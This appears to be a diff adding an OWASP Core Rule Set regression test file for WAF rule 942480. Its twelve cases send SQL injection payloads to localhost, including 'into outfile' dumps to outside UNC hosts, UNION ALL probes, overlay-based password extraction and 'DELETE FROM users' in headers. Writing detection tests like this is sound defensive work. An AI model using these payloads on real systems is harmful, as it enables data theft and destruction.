@@ -1,0 +1,210 @@
+---
+meta:
+  author: "Jose Nazario"
+  description: None
+  enabled: true
+  name: 942480.yaml
+tests:
+  - test_title: 942480-1
+    desc: "SQL Injection Attack"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Host: "localhost"
+              Cache-Control: "no-cache, no-store, must-revalidate"
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            # variable name boundary attacks
+            uri: "/?'msdasql'"
+            version: HTTP/1.0
+          output:
+            log_contains: "id \"942480"
+  - test_title: 942480-2
+    desc: "SQL Injection Attack"
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Host: "localhost"
+              Cache-Control: "no-cache, no-store, must-revalidate"
+              # variable name boundary attacks
+              Cookie: "'msdasql'"
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            version: HTTP/1.0
+          output:
+            log_contains: "id \"942480"
+  - test_title: 942480-3
+    desc: "Data dump using 'into outfile'"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=EmptyValue into outfile '\\\\\\\\jviw6aoxefbjk0luyi6oiwjv5unittests.coreruleset.org\\\\xct'; --"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942480"
+  - test_title: 942480-4
+    desc: "Data dump using 'into outfile'"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=/config.ini' into outfile '\\\\\\\\il7vw9ew4e1iazbtohwn8v9uvl1hunitetests.coreruleset.org\\\\yxq'; --"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942480"
+  - test_title: 942480-5
+    desc: "SQL injection using 'UNION ALL"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=0.3480567293179807' UNION ALL select NULL --"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942480"
+  - test_title: 942480-6
+    desc: "SQL injection using 'UNION ALL"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=config.ini\") UNION ALL select NULL --"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942480"
+  - test_title: 942480-7
+    desc: "SQL injection using 'UNION ALL"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=CRS) UNION ALL select NULL --"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942480"
+  - test_title: 942480-8
+    desc: "SQL injection using 'UNION ALL"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: POST
+            port: 80
+            uri: "/"
+            data: "var=CRS3\") UNION ALL select NULL --"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942480"
+  - test_title: 942480-9
+    desc: "SQL injection using 'overlay(...placing..)"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            uri: "/index.php?id=overlay(password%20placing%20%27%27%20from%201%20for%200)::int"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942480"
+  - test_title: 942480-10
+    desc: "SQL injection in User-Agent"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: DELETE FROM users;--
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            uri: "/"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942480"
+  - test_title: 942480-11
+    desc: "SQL injection in arbitrary header"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              SomeHeader: DELETE FROM users;--
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            uri: "/"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942480"
+  - test_title: 942480-12
+    desc: "SQL injection using 'overlay(...placing..) with newlines"
+    stages:
+      - stage:
+          input:
+            dest_addr: 127.0.0.1
+            headers:
+              Host: localhost
+              User-Agent: "OWASP CRS test agent"
+              Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+            method: GET
+            port: 80
+            uri: "/index.php?id=overlay(password%0aplacing%0a%27%27%0afrom%201%20for%200)::int"
+            version: HTTP/1.0
+          output:
+            log_contains: id "942480"
